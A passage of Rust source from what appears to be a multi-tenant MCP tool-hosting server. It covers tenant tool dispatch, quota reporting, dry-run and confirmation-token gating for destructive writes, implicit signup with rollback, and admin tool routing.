        let runs = self.state.db.count_runs_done_since(tenant_id, last_seen_unix).await?;
        let inbox = self.state.db.count_unread_messages(tenant_id).await?;
        let days = ((now_unix() - last_seen_unix) / 86_400).max(0);
        Ok(json!({"calls": calls, "runs": runs, "inbox": inbox, "days": days}))
    }

    /// PRD-mcphost-session-bound-tenant-key P1 requirement 4 (AC6): the
    /// namespace of the tenant THIS session's own memory holds -- an
    /// implicit signup, or a successful `tenant_key`-argument auth --
    /// independent of however the CURRENT call itself authenticated.
    /// `None` when there's no session id at all, neither memory holds an
    /// entry, or the remembered tenant has since been deleted.
    async fn session_tenant_namespace(&self, session_id: Option<&str>) -> Option<String> {
        let sid = session_id?;
        let now = now_unix();
        let tenant_id = self
            .state
            .implicit_signup_memory
            .lookup(sid, now)
            .or_else(|| self.state.tenant_key_arg_memory.lookup(sid, now))?;
        self.state.db.find_tenant_by_id(tenant_id).await.ok()?.map(|t| t.namespace)
    }

    /// PRD-mcphost-data-quota-in-every-response R2/R3: the one attach point
    /// for `data.quota` -- every data verb reaches here after dispatch, so
    /// no verb edits its own response.
    #[allow(clippy::too_many_arguments)]
    async fn dispatch_tenant_tool(
        &self,
        tenant: &Tenant,
        subject: Option<&str>,
        auth_method: &str,
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-resources-for-tenant-data requirements 4 and 6: the
        // one place a committed write tells resource subscribers.
        // Boxed: this frame is re-entered once per forwarding level (FORWARD_STACK_BUDGET).
        let hint = crate::resources::write_hint(name, &args).map(Box::new);
        // PRD-mcphost-subscriptions-listen R4: what a tools/list-changing verb
        // needs remembered from before it ran; boxed so this frame stays small.
        let listen = Box::pin(crate::listen::Pending::begin(&self.state, tenant, name, &args)).await;
        // The forwarding boundary. A wrapper verb (`FORWARDING_WRAPPERS`) re-enters
        // this dispatcher with the verb it forwards, so it is on the stack UNDER
        // the forwarded verb. Dispatched the usual way it would hold the
        // `dispatch_tenant_tool_dry_run` + `dispatch_tenant_tool_inner` poll
        // frames (~540 KiB in a debug build, most of it that one match's
        // per-arm future temporaries) while the forwarded verb pays for its own,
        // so every forward cost two. Skip them for the wrapper: none is a write
        // verb (`wrappers_are_not_write_verbs` pins that), so `dry_run` passes
        // straight through to `inner`, whose first line is the `fields` check
        // repeated here. run 326 / run 953 (10-17), FORWARD_STACK_BUDGET.
        let result = if FORWARDING_WRAPPERS.contains(&name) {
            // The same two checks `dispatch_tenant_tool_inner` makes first: the
            // wrapper's descriptor validates its own call like every other verb.
            match crate::precheck::precheck_tenant_call(&self.state.kinds, name, &args) {
                Ok(()) => {
                    crate::host_args::note_handler_run(&tenant.namespace, name);
                    self.forwarding_wrapper(tenant, calls_auth_method, end_user, name, args).await
                }
                Err(e) => Err(e),
            }
        } else {
            // `Box::pin`: run 945 verbfwd_ac01 stack overflow (CI 39080964983) -- the hint
            // locals added here grew this frame past the 2 MiB test-thread stack.
            // The task-local rides inside the same box (PRD-mcphost-subscriptions-listen R5).
            Box::pin(crate::listen::CURRENT_VERB.scope(
                crate::listen::canonical_verb(name).to_string(),
                self.dispatch_tenant_tool_dry_run(
                    tenant,
                    subject,
                    auth_method,
                    calls_auth_method,
                    end_user,
                    session_id,
                    name,
                    args,
                ),
            ))
            .await
        };
        if let (Some(hint), Ok(out)) = (hint, &result) {
            crate::resources::after_write(&self.state, tenant.id, *hint, out);
        }
        if let (Some(listen), Ok(out)) = (listen, &result) {
            Box::pin(listen.finish(&self.state, tenant, out)).await;
        }
        self.attach_data_quota(tenant, name, result).await
    }

    /// The three verbs that forward a call back into `dispatch_tenant_tool`:
    /// `host.tool.call` / `host.estimate` (-> `forward_host_verb`) and
    /// `host.tool.test` (-> `test_forward_host_verb`). One body for both ways in:
    /// `dispatch_tenant_tool`'s early route and `dispatch_tenant_tool_inner`'s arm.
    #[allow(clippy::too_many_arguments)]
    async fn forwarding_wrapper(
        &self,
        tenant: &Tenant,
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        match name {
            "host.tool.test" => self.tool_test_stamping(tenant, args).await,
            // PRD-mcphost-call-cost-estimate requirement 3: `host.estimate` IS
            // `host.tool_call` with `dry_run` forced true -- same handler, same
            // argument names, so its verdict cannot differ from the flag's.
            "host.estimate" => {
                let mut args = args;
                if let Some(obj) = args.as_object_mut() {
                    crate::envelope::force_dry_run_arg(obj);
                }
                self.host_tool_call(tenant, args, calls_auth_method, end_user).await
            }
            _ => self.host_tool_call(tenant, args, calls_auth_method, end_user).await,
        }
    }

    /// Adds `data.quota` (the ceilings `name` touches) to a data verb's
    /// success, and to its `*quota_exceeded` refusal (AC5: the refused
    /// ceiling reads `remaining: 0` under `data.quota.<ceiling>`). Where a
    /// store's refusal named its ceiling as a string `data.quota`, that
    /// name moves to `data.ceiling` so `data.quota` is the one object
    /// shape on every response. A plan missing from the catalog omits it
    /// and the call is otherwise untouched.
    async fn attach_data_quota(
        &self,
        tenant: &Tenant,
        name: &str,
        result: Result<Value, AppError>,
    ) -> Result<Value, AppError> {
        use crate::plans::{DataQuota, data_ceilings_of, touched_ceilings};
        let Some(plan) = self.state.plans.get(&tenant.plan) else {
            return result;
        };
        let touched = touched_ceilings(name, data_ceilings_of(&plan.ceilings_flat()));
        if touched.is_empty() {
            return result;
        }
        let wanted = match &result {
            Ok(v) => v.is_object(),
            // R4: the blob refusals (`quota_blobs`, `quota_blob_bytes`,
            // `blob_too_large`, `blob_expired`, ...) carry the room left too.
            Err(AppError::Structured { code, .. }) => {
                code.contains("quota_exceeded") || code.starts_with("blob_") || code.starts_with("quota_blob")
            }
            Err(_) => false,
        };
        if !wanted {
            return result;
        }
        let usage = match self.state.db.data_usage_at(tenant.id, crate::blobs::now(&self.state)).await {
            Ok(u) => u,
            Err(e) => {
                tracing::warn!(tenant = %tenant.namespace, error = %e, "data_usage failed; data.quota omitted");
                return result;
            }
        };
        let mut quota = DataQuota::render_of(touched, &usage);
        match result {
            Ok(mut value) => {
                if let Some(obj) = value.as_object_mut() {
                    let slot = obj.entry("data").or_insert_with(|| json!({}));
                    if let Some(data) = slot.as_object_mut() {
                        data.entry("quota").or_insert(quota);
                    }
                }
                Ok(value)
            }
            Err(AppError::Structured { code, message, mut data }) => {
                // The ceiling that refused has no room left, whatever the
                // size of the write that tripped it.
                let hit = data
                    .get("quota")
                    .and_then(Value::as_str)
                    .or_else(|| data.pointer("/limit/name").and_then(Value::as_str))
                    .map(str::to_string);
                if let Some(hit) = hit
                    && let Some(entry) = quota.get_mut(&hit).and_then(Value::as_object_mut)
                {
                    entry.insert("remaining".to_string(), json!(0));
                }
                if let Some(obj) = data.as_object_mut() {
                    if let Some(name) = obj.remove("quota").filter(|q| !q.is_object()) {
                        obj.insert("ceiling".to_string(), name);
                    }
                    obj.insert("quota".to_string(), quota);
                }
                Err(AppError::Structured { code, message, data })
            }
            Err(e) => Err(e),
        }
    }

    #[allow(clippy::too_many_arguments)]
    async fn dispatch_tenant_tool_dry_run(
        &self,
        tenant: &Tenant,
        subject: Option<&str>,
        auth_method: &str,
        // PRD-mcphost-oauth-demand-signal requirement 1 (AC1): the same
        // credential kind as `auth_method` above, but in `calls.auth_method`'s
        // own `{key, issuer_jwt, hosted_token}` domain rather than
        // `host.whoami`'s pre-existing `{key, oauth, hosted_token}` one --
        // kept as a second parameter rather than reusing `auth_method` so
        // neither call site has to remember which domain the other reads.
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        // PRD-mcphost-session-bound-tenant-key P1 requirement 4 (AC6):
        // this connection's own server-issued session id, when the dispatch
        // has one at all (the chain-host-step bridge call site has none --
        // there is no HTTP request here) -- only `host.whoami` reads it,
        // to report `session_tenant`.
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-dry-run-on-write-verbs R3/R5: `dry_run: true` on a
        // registered write verb. `Supported` runs the verb inside the same
        // savepoint scope `host.tool_test` uses, rolls it back whatever the
        // outcome, and answers the `would` diff; a real error (quota,
        // not_found, args_invalid) is returned unchanged. `NoDryRun` refuses
        // with its reason. A `publish` verb keeps its own gate-report
        // `dry_run` (control::tool_publish) and passes straight through.
        let verb = crate::write_verbs::lookup(name);
        let dry_requested = crate::write_verbs::dry_run_requested(&args);
        if let Some(verb) = verb
            && dry_requested
        {
            match verb.dry_run {
                crate::write_verbs::DryRun::NoDryRun(reason) => {
                    return Err(crate::write_verbs::no_dry_run_error(verb, reason));
                }
                crate::write_verbs::DryRun::Supported if verb.kind != crate::write_verbs::Kind::Publish => {
                    let notes = self
                        .dry_run_notes(tenant, subject, auth_method, calls_auth_method, end_user, session_id, name, &args)
                        .await?;
                    let mut would = crate::write_verbs::build_would(verb, &args, &notes);
                    if crate::confirm::gated(verb) {
                        self.confirm_decorate_dry_run(tenant, verb, &args, &notes, &mut would).await?;
                    }
                    return Ok(would);
                }
                crate::write_verbs::DryRun::Supported => {}
            }
        }
        // PRD-mcphost-destructive-verb-confirmation-token R1/R5: a real call
        // of a confirm-gated verb.
        if let Some(verb) = verb
            && !dry_requested
            && crate::confirm::gated(verb)
        {
            if self.state.db.tenant_is_scratch(tenant.id).await? {
                let mut result = self
                    .dispatch_inner_boxed(
                        tenant,
                        subject,
                        auth_method,
                        calls_auth_method,
                        end_user,
                        session_id,
                        name,
                        confirm_stripped(&args),
                    )
                    .await?;
                mark_scratch(&mut result);
                return Ok(result);
            }
            let min = self.state.plans.get(&tenant.plan).map_or(0, |p| p.confirm_rows_min);
            let mut consumed = None;
            if min > 0 {
                // A dry run that errors (nothing to drop, bad args) measures
                // nothing: the real call below gives the real answer.
                if let Ok(notes) = self
                    .dry_run_notes(tenant, subject, auth_method, calls_auth_method, end_user, session_id, name, &args)
                    .await
                    && crate::confirm::needs_confirm(&notes, min)
                {
                    consumed = Some(self.confirm_check(tenant, verb, name, &args, &notes, min).await?);
                }
            }
            // A consumed token is the caller's explicit confirmation of the
            // diff, so a lineage gate on the same verb (`confirm: true`) is
            // satisfied by it -- one `confirm` key cannot carry both.
            let mut inner_args = confirm_stripped(&args);
            if consumed.is_some()
                && let Some(obj) = inner_args.as_object_mut()
            {
                obj.insert("confirm".to_string(), json!(true));
            }
            let result = self
                .dispatch_inner_boxed(
                    tenant,
                    subject,
                    auth_method,
                    calls_auth_method,
                    end_user,
                    session_id,
                    name,
                    inner_args,
                )
                .await;
            if result.is_err()
                && let Some(hash) = consumed
            {
                // The write the token authorised did not happen.
                let _ = self.state.db.confirm_token_release(hash).await;
            }
            return result;
        }
        self.dispatch_inner_boxed(
            tenant,
            subject,
            auth_method,
            calls_auth_method,
            end_user,
            session_id,
            name,
            args,
        )
        .await
    }

    /// `dispatch_tenant_tool_inner`, its future built and boxed in this frame
    /// instead of its caller's. `dispatch_tenant_tool_dry_run` calls it from four
    /// places, and in a debug build each call site held its own ~14 KiB copy of
    /// the future in that function's poll frame (88 KiB, once per dispatch, so
    /// twice per forwarded verb); here the copy is gone before the poll starts.
    #[allow(clippy::too_many_arguments)]
    fn dispatch_inner_boxed<'a>(
        &'a self,
        tenant: &'a Tenant,
        subject: Option<&'a str>,
        auth_method: &'a str,
        calls_auth_method: &'a str,
        end_user: Option<&'a crate::enduser::EndUser>,
        session_id: Option<&'a str>,
        name: &'a str,
        args: Value,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Value, AppError>> + Send + 'a>> {
        Box::pin(self.dispatch_tenant_tool_inner(
            tenant,
            subject,
            auth_method,
            calls_auth_method,
            end_user,
            session_id,
            name,
            args,
        ))
    }

    /// Runs `name` with `args` (minus `dry_run`/`confirm`) inside a
    /// rolled-back dry-run scope and returns the `would` notes it collected.
    #[allow(clippy::too_many_arguments)]
    async fn dry_run_notes(
        &self,
        tenant: &Tenant,
        subject: Option<&str>,
        auth_method: &str,
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        session_id: Option<&str>,
        name: &str,
        args: &Value,
    ) -> Result<Vec<(&'static str, Value)>, AppError> {
        let mut inner_args = confirm_stripped(args);
        if let Some(obj) = inner_args.as_object_mut() {
            obj.remove("dry_run");
            if crate::confirm::confirm_arg(args).is_some() {
                // Measuring a call that carries a token: the token vouches
                // for the lineage gate too (see the real-call path).
                obj.insert("confirm".to_string(), json!(true));
            }
        }
        let ctx = crate::dryrun::DryRunCtx::new(self.state.db.path().to_path_buf(), self.state.db.cfg());
        let outcome = crate::dryrun::with_dry_run(
            ctx.clone(),
            Box::pin(self.dispatch_tenant_tool_inner(
                tenant,
                subject,
                auth_method,
                calls_auth_method,
                end_user,
                session_id,
                name,
                inner_args,
            )),
        )
        .await;
        crate::dryrun::finish(ctx.clone()).await;
        outcome?;
        Ok(ctx.would_notes())
    }

    fn confirm_now(&self) -> i64 {
        crate::state::now_unix() + self.state.confirm_clock_offset_secs.load(std::sync::atomic::Ordering::Relaxed)
    }

    /// R2/R5: a dry run of a gated verb mints `confirm` beside `would` when
    /// the diff needs one; on a scratch tenant it says `_meta.scratch` and
    /// never mints.
    #[allow(clippy::too_many_arguments)]
    async fn confirm_decorate_dry_run(
        &self,
        tenant: &Tenant,
        verb: &crate::write_verbs::WriteVerb,
        args: &Value,
        notes: &[(&'static str, Value)],
        would: &mut Value,
    ) -> Result<(), AppError> {
        if self.state.db.tenant_is_scratch(tenant.id).await? {
            mark_scratch(would);
            return Ok(());
        }
        let min = self.state.plans.get(&tenant.plan).map_or(0, |p| p.confirm_rows_min);
        if !crate::confirm::needs_confirm(notes, min) {
            return Ok(());
        }
        let token = crate::confirm::new_token();
        self.state
            .db
            .confirm_token_mint(
                tenant.id,
                crate::confirm::token_hash(&token),
                verb.name.to_string(),
                crate::confirm::args_hash(args),
                crate::confirm::diff_hash(notes),
                self.confirm_now() + crate::confirm::TOKEN_TTL_S,
            )
            .await?;
        if let Some(obj) = would.as_object_mut() {
            obj.insert("confirm".to_string(), json!(token));
        }
        Ok(())
    }

    /// R1-R3: validates the `confirm` argument of a large destructive real
    /// call and consumes the token; returns the consumed token's hash.
    #[allow(clippy::too_many_arguments)]
    async fn confirm_check(
        &self,
        tenant: &Tenant,
        verb: &crate::write_verbs::WriteVerb,
        name: &str,
        args: &Value,
        notes: &[(&'static str, Value)],
        min: i64,
    ) -> Result<String, AppError> {
        let would = || crate::write_verbs::build_would(verb, args, notes)["would"].clone();
        let Some(token) = crate::confirm::confirm_arg(args) else {
            return Err(crate::confirm::required_error(name, args, would(), min));
        };
        let hash = crate::confirm::token_hash(token);
        let Some(row) = self.state.db.confirm_token_get(tenant.id, hash.clone()).await? else {
            return Err(crate::confirm::invalid_error("unknown", None));
        };
        let reason = if row.verb != verb.name {
            Some(("unknown", None))
        } else if row.used_unix.is_some() {
            Some(("used", None))
        } else if row.expires_unix <= self.confirm_now() {
            Some(("expired", None))
        } else if row.args_hash != crate::confirm::args_hash(args) {
            Some(("args_changed", None))
        } else if row.diff_hash != crate::confirm::diff_hash(notes) {
            Some(("state_changed", Some(would())))
        } else {
            None
        };
        if let Some((reason, would)) = reason {
            return Err(crate::confirm::invalid_error(reason, would));
        }
        if !self.state.db.confirm_token_consume(hash.clone(), self.confirm_now()).await? {
            return Err(crate::confirm::invalid_error("used", None));
        }
        Ok(hash)
    }

    #[allow(clippy::too_many_arguments)]
    async fn dispatch_tenant_tool_inner(
        &self,
        tenant: &Tenant,
        subject: Option<&str>,
        auth_method: &str,
        // PRD-mcphost-oauth-demand-signal requirement 1 (AC1): the same
        // credential kind as `auth_method` above, but in `calls.auth_method`'s
        // own `{key, issuer_jwt, hosted_token}` domain rather than
        // `host.whoami`'s pre-existing `{key, oauth, hosted_token}` one --
        // kept as a second parameter rather than reusing `auth_method` so
        // neither call site has to remember which domain the other reads.
        calls_auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
        // PRD-mcphost-session-bound-tenant-key P1 requirement 4 (AC6):
        // this connection's own server-issued session id, when the dispatch
        // has one at all (the chain-host-step bridge call site has none --
        // there is no HTTP request here) -- only `host.whoami` reads it,
        // to report `session_tenant`.
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-fields-projection-on-list-verbs R4: `fields` on an
        // excused (`unpaged_reason`) verb is refused, never silently ignored.
        // PRD-mcphost-input-schema-is-the-validator R3: the descriptor is the
        // validator -- a structural violation is refused before any handler.
        crate::precheck::precheck_tenant_call(&self.state.kinds, name, &args)?;
        crate::host_args::note_handler_run(&tenant.namespace, name);
        let ctx = ArmCtx { tenant, subject, auth_method, calls_auth_method, end_user, session_id, name, args };
        // The verb table is generated from the descriptor registry
        // (`scripts/gen-dispatch-table.sh`); each row's function builds its future on
        // the heap, so this frame holds one pointer, not one future per verb.
        if let Some(arm) = crate::dispatch_table::lookup(name) {
            return arm(self, ctx).await;
        }
        match self.arm_unadvertised(ctx) {
            Some(fut) => fut.await,
                // PRD-mcphost-tool-naming-convention-and-aliases requirement 6
                // (AC6): `did_you_mean` against every *canonical* control-plane
                // name (never a deprecated alias -- see
                // `AppError::host_tool_not_found`'s own doc), not the bare
                // `ToolNotFound` every other unmatched-name case in this crate
                // still uses (those have no "nearby real name" universe this
                // cheap to compute at the call site).
            None => Err(unknown_host_tool(&self.state.kinds, name)),
        }
    }

    /// PRD-mcphost-implicit-signup requirement 1 (AC1): `call_tool`'s own
    /// `(Auth::Anonymous, name) if ... host./billing. ...` arm funnels
    /// here. Mints a tenant through [`control::signup`] (the exact same
    /// limiter, fleet-IP classification, and pause kill-switch `signup`
    /// itself uses -- Technical Considerations: "the limiter is the single
    /// choke point; this PRD adds no second limiter"), reuses
    /// [`bind_session_to_created_tenant`] verbatim for the session binding
    /// and `tools/list_changed` notification, mints this tenant's personal
    /// `/u/{secret}/mcp` URL (the same generate-then-rotate pattern
    /// [`control::key_rotate`] uses to hand a tenant its first URL), then
    /// re-dispatches `name`/`args` -- the call that triggered creation --
    /// as that tenant, so the caller sees its own real result plus
    /// `onboarding` in one response, not a separate "signed up" response
    /// (Technical Considerations).
    #[allow(clippy::too_many_arguments)]
    async fn implicit_signup_and_dispatch(
        &self,
        ctx: &RequestContext<RoleServer>,
        parts: &http::request::Parts,
        source: &str,
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-implicit-signup-mints-only-on-success R1: the SAME check
        // `dispatch_tenant_tool_inner` runs, before `control::signup` charges the
        // limiter or writes a row -- a call that cannot work mints nothing.
        crate::precheck::precheck_tenant_call(&self.state.kinds, name, &args)?;
        let (client_name, client_version) = match peer_client_info(ctx) {
            Some((name, version)) => (Some(name), Some(version)),
            None => (None, None),
        };
        // Open question, drafted resolution: the caller's own reported
        // `clientInfo.name` when present, else `agent-<8-char ulid
        // suffix>` -- the PRD's own TL;DR naming.
        let display_name = client_name.clone().unwrap_or_else(|| {
            let ulid = crate::state::new_ulid();
            format!("agent-{}", ulid[ulid.len() - 8..].to_lowercase())
        });
        let signup_value = control::signup(
            &self.state,
            &json!({"name": display_name, "source": "implicit"}),
            source,
            control::SignupAttribution {
                synthetic_header: synthetic_header(parts).as_deref(),
                client_name: client_name.as_deref(),
                client_version: client_version.as_deref(),
                user_agent: user_agent_header(parts).as_deref(),
                origin_header: origin_header(parts).as_deref(),
            },
        )
        .await
        .map_err(|e| match e {
            // Requirement 3 (AC3): the limiter's own refusal, renamed and
            // enriched for this path alone -- the explicit `signup` tool
            // keeps returning plain `rate_limited` (ac09_signup_rate_limit.rs
            // and friends pin that), unaffected since this mapping only
            // runs on the implicit branch's own call to `control::signup`.
            AppError::RateLimited => AppError::signup_rate_limited(
                &self.state.public_url,
                crate::state::SIGNUP_RATE_LIMIT_WINDOW_SECS,
            ),
            other => other,
        })?;

        let key = signup_value
            .get("key")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::Internal("implicit signup returned no key".to_string()))?
            .to_string();
        let tenant = self
            .state
            .db
            .find_tenant_by_key_hash(hash_key(&key))
            .await?
            .ok_or_else(|| AppError::Internal("implicit signup's tenant vanished".to_string()))?;

        // PRD-mcphost-implicit-signup-mints-only-on-success R2: everything after the
        // mint runs under the per-call deadline and `catch_unwind`; an error, a
        // timeout or a panic deletes the tenant it created and tells the caller how
        // to get a key.
        use futures_util::FutureExt as _;
        let guarded = std::panic::AssertUnwindSafe(tokio::time::timeout(
            self.state.call_timeout,
            self.implicit_after_mint(ctx, &tenant, session_id, name, args),
        ))
        .catch_unwind()
        .await;
        let err = match guarded {
            Ok(Ok(Ok(value))) => {
                // R3: a client that presented no server-issued session id has no way
                // to be recognised on its next call but its peer (IP + User-Agent);
                // `redeemed_peers` is the memory the refusal block reads.
                let presented = parts
                    .extensions
                    .get::<crate::session_bind::SessionPresented>()
                    .is_some_and(|p| p.0);
                if !presented {
                    self.state.redeemed_peers.record_at(
                        &request_peer_key(parts),
                        &tenant.namespace,
                        session_id,
                        now_unix(),
                    );
                }
                return Ok(value);
            }
            Ok(Ok(Err(e))) => e,
            Ok(Err(_elapsed)) => AppError::CallTimeout(self.state.call_timeout.as_secs().max(1)),
            Err(_panic) => AppError::Internal("implicit signup dispatch panicked".to_string()),
        };
        self.rollback_implicit_signup(&tenant, session_id).await;
        Err(err.with_get_a_key(&self.state.public_url))
    }

    /// R4: one `signup_events` row (kind `implicit_peer_refused`) per R3 refusal,
    /// with the source IP and its `ip_class`; the limiter counts only `signup`.
    async fn note_implicit_peer_refused(&self, parts: &http::request::Parts) {
        let ip = source_ip(parts);
        let ip_class = crate::state::classify_ip_class(&ip).to_string();
        if let Err(e) = self.state.db.record_implicit_peer_refused(ip, ip_class).await {
            tracing::warn!(error = %e, "failed to record implicit_peer_refused");
        }
    }

    /// R2: delete the tenant an implicit signup minted for a call that then failed,
    /// through the path `admin.tenant_delete` uses, recorded as
    /// `implicit_signup_rolled_back`; the `signup_events` row stays (the attempt
    /// still counts toward the limiter).
    async fn rollback_implicit_signup(&self, tenant: &Tenant, session_id: Option<&str>) {
        if let Some(sid) = session_id {
            self.state.implicit_signup_memory.drop_binding(sid);
        }
        if let Err(e) = admin::delete_tenant_cascade(&self.state, &tenant.namespace, ROLLED_BACK_ACTION).await {
            tracing::error!(error = %e, tenant = %tenant.namespace, "implicit signup rollback failed; orphan left");
        }
    }

    /// Everything an implicit signup does once the tenant exists (R2's guarded
    /// span): the session memory, the personal URL, the dispatch of the call that
    /// triggered the mint, and the `onboarding` envelope.
    #[allow(clippy::too_many_arguments)]
    async fn implicit_after_mint(
        &self,
        ctx: &RequestContext<RoleServer>,
        tenant: &Tenant,
        session_id: Option<&str>,
        name: &str,
        args: Value,
    ) -> Result<Value, AppError> {
        // PRD-mcphost-session-bound-tenant-key requirement 1/3: records this
        // connection's own implicit signup into `implicit_signup_memory`,
        // NOT `state.session_bindings` the way this call site used to
        // (via `bind_session_to_created_tenant`) -- a second implicit
        // signup attempt on this same connection must be refused and named
        // by default (requirement 2), never silently served the way an
        // explicit `signup`/`host.redeem` binding still is.
        record_implicit_signup_memory(&self.state, session_id, &ctx.peer, tenant).await;

        // Requirement 2's own dependency on PRD-mcphost-url-bound-tenants:
        // mints this tenant's personal URL right away -- the onboarding
        // note below IS that URL, so it can't wait for a separate
        // `host.key_rotate` call.
        let url_secret = crate::auth::generate_url_secret();
        self.state
            .db
            .rotate_tenant_url_secret(tenant.id, hash_key(&url_secret))
            .await?;
        let url = format!(
            "{}/u/{}/mcp",
            self.state.public_url.trim_end_matches('/'),
            url_secret
        );

        tracing::info!(
            tenant = %tenant.namespace,
            tool = %name,
            "implicit tenant created for anonymous call"
        );

        // PRD-mcphost-msg-wait-long-poll-contract R5: a just-created tenant's
        // inbox cannot hold anything, so its `host.msg.wait` times out at
        // once instead of sleeping out the full default wait.
        let injected = crate::implicit_fault::take(&tenant.display_name);
        if let Some(fault) = injected {
            return Err(crate::implicit_fault::fire(fault).await);
        }
        let mut value = if name == "host.msg.wait" {
            crate::longpoll::wait_response(json!({"messages": []}), true, Instant::now(), crate::longpoll::clamp_timeout_s(args.get("timeout_s").and_then(Value::as_i64)))
        } else {
            self.dispatch_tenant_tool(tenant, None, "key", "session", None, session_id, name, args)
                .await?
        };
        // R4: a successful first call is a used tool, so the tenant is not one of
        // `admin.funnel`'s `implicit_zero_ok_calls`.
        if name.starts_with("host.")
            && let Err(e) = self
                .state
                .db
                .record_host_tool_use(tenant.id, name.to_string(), "direct".to_string(), now_unix())
                .await
        {
            tracing::warn!(tenant = %tenant.namespace, error = %e, "record_host_tool_use failed");
        }
        // Requirement 2 (AC1): the first response's result envelope gains
        // `onboarding`; requirement 2's second half (AC2) holds by
        // construction -- this function only ever runs on the call that
        // just created the tenant, never on a later call on the same
        // (now session-bound) connection.
        if let Some(obj) = value.as_object_mut() {
            obj.insert(
                "onboarding".to_string(),
                json!({
                    "tenant": tenant.namespace,
                    "url": url,
                    // PRD-mcphost-session-bound-tenant-key P2 requirement 5
                    // (the note "names the rule"): a later key-less call on
                    // THIS connection is refused and named, not a second
                    // implicit signup -- so an agent that reads this once
                    // never has to discover `tenant_key_missing` the hard
                    // way.
                    "note": format!(
                        "You are now tenant {0}. Save this URL as your mcphost server address; \
                         it is your credential. Call host.key_rotate if it leaks. Later calls on \
                         this connection without tenant_key will be refused, not re-signed-up as \
                         a new tenant -- pass {0}'s own key (or reconnect over the URL above).",
                        tenant.namespace
                    ),
                    // PRD-mcphost-first-call-gift requirement 3 (AC8): this
                    // session is already URL-bound (the `url` above), so
                    // `memory_line` carries it rather than falling back to
                    // `host.whoami`. No `welcome_back` on this same
                    // response -- this tenant was just created, so it has
                    // no earlier session (mutually exclusive by
                    // construction: the outer `auth` this call resolved
                    // stays `Auth::Anonymous` throughout this function,
                    // which is exactly what gates `welcome_back` off in
                    // `call_tool`'s own success handler).
                    "memory_line": control::memory_line(Some(&url)),
                    "memory_hint": control::MEMORY_HINT,
                    // PRD-mcphost-ownership-moment requirement 1 (AC1): the
                    // same stable claim link `host.whoami` will keep
                    // reporting until this tenant is claimed.
                    "claim_url": crate::claim::claim_url_for_tenant(&self.state.public_url, tenant),
                }),
            );
        }
        Ok(value)
    }

    /// PRD-mcphost-oauth-first-grant-signup requirement 4: the
    /// `onboarding` envelope for a tenant OAuth consent created. Mints the
    /// tenant's personal `/u/{secret}/mcp` URL here (the secret is stored
    /// hashed, so the first call is the only moment it can be shown), the
    /// same generate-then-rotate [`Self::implicit_signup_and_dispatch`] uses.
    async fn first_grant_onboarding(&self, tenant: &Tenant) -> Result<Value, AppError> {
        let url_secret = crate::auth::generate_url_secret();
        self.state
            .db
            .rotate_tenant_url_secret(tenant.id, hash_key(&url_secret))
            .await?;
        let url = format!("{}/u/{}/mcp", self.state.public_url.trim_end_matches('/'), url_secret);
        let invite_url = self
            .state
            .db
            .find_standing_invite_for_tenant(tenant.id)
            .await?
            .and_then(|invite| invite.code_plain)
            .map(|code| crate::invites::invite_url(&self.state, &code));
        Ok(json!({
            "tenant": tenant.namespace,
            "url": url,
            "invite_url": invite_url,
            "note": format!(
                "You are now tenant {0}, created when you approved this connection. Save this URL \
                 as your mcphost server address; it is your credential. Call host.key_rotate if \
                 it leaks. invite_url is the link to share with others.",
                tenant.namespace
            ),
            "claim_url": crate::claim::claim_url_for_tenant(&self.state.public_url, tenant),
        }))
    }

    async fn dispatch_admin_tool(&self, name: &str, args: Value) -> Result<Value, AppError> {
        // PRD-mcphost-runs-list-filter-enums-generated R3: a checked admin
        // descriptor is the validator, through the SAME `validate_host_args`
        // `call_tool_inner` runs for `host.*` -- one validator, one more
        // call site.
        crate::precheck::precheck_args(&self.state.kinds, name, &args)?;
        // Counted after the validator passed, keyed by the `tenant` (else
        // `prefix`) argument -- empty for "every tenant" -- so concurrent
        // tests cannot disturb each other's count.
        let counted_for = args
            .get("tenant")
            .or_else(|| args.get("prefix"))
            .and_then(Value::as_str)
            .unwrap_or_default();
        crate::host_args::note_handler_run(counted_for, name);
        let result = match name {
            "admin.tenants" => admin::tenants(&self.state, &args).await,
            "admin.tenant_disable" => admin::tenant_disable(&self.state, &args).await,
            "admin.tenant_enable" => admin::tenant_enable(&self.state, &args).await,
            "admin.calls_export" => admin::calls_export(&self.state, &args).await,
            "admin.tenant_delete" => admin::tenant_delete(&self.state, &args).await,
            "admin.tenant_delete_by_prefix" => {
                admin::tenant_delete_by_prefix(&self.state, &args).await
            }
            "admin.usage" => admin::usage(&self.state, &args).await,
            "admin.usage.top" => admin::usage_top(&self.state, &args).await,
            "admin.prune_now" => admin::prune_now(&self.state).await,
            "admin.db.stats" => admin::db_stats(&self.state).await,
            "admin.dependency_reaudit" => admin::dependency_reaudit(&self.state).await,
            "admin.tool_list" => admin::tool_list(&self.state, &args).await,
            "admin.tenant_verify_namespace" => {
                admin::tenant_verify_namespace(&self.state, &args).await
            }
            "admin.tenant_verify_owner" => admin::tenant_verify_owner(&self.state, &args).await,
            "admin.sandbox_recheck" => admin::sandbox_recheck(&self.state).await,
            "admin.billing_ledger" => admin::billing_ledger(&self.state, &args).await,
            "admin.plan_set" => admin::plan_set(&self.state, &args).await,
            "admin.meter_status" => admin::meter_status(&self.state).await,
            "admin.tenant_set_synthetic" => admin::tenant_set_synthetic(&self.state, &args).await,
            "admin.tenants_set_synthetic" => {
                admin::tenants_set_synthetic(&self.state, &args).await
            }
            "admin.reclassify_fleet_ips" => admin::reclassify_fleet_ips(&self.state).await,
            "admin.audit_log" => admin::audit_log(&self.state, &args).await,
            "admin.shared_tools" => admin::shared_tools(&self.state).await,
            "admin.tool_unshare" => admin::tool_unshare(&self.state, &args).await,
